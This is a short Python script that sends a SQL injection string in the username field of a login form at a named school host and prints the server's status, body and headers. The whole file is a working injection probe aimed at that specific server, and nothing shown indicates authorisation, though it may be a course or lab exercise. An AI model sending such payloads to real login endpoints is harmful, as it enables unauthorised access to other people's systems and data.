import requests

data = {
    'username': "' OR 1=2 -- ",
    'password': "kek"
}

r = requests.post('http://school.mirea.tech:8080/login', data=data)
print(r.status_code)
print(r.text)
print(r.headers)
